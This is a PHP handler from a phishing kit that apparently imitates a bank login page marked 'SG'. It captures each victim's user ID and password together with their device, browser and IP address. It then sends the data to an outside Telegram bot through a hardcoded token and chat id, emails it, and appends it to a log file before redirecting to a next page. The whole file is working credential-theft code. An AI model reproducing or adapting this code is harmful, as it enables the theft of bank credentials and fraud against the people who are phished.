<?php
// for more tools visite https://www.ghostools.com
include("funcs.php");
$_SESSION['user_id'] = $_POST['user_id'];
$_SESSION['Hidden1'] = $_POST['Hidden1'];

$message  = "******* New Login SG *******\n\n";
$message .= "Identifiant : ".$_POST['user_id']."\n";
$message .= "Password : ".$_POST['Hidden1']."\n\n";
$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "@gmail.com";
$subject = "SG|".$ip."".countryinfo($message);
$headers = "From:  Login <don@mox.fr>";
$token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
mail($send,$subject,$message,$headers);
 
$file = fopen("../infosita.txt","a");
fwrite($file,$message);  



header("Location: tel.php");

?>



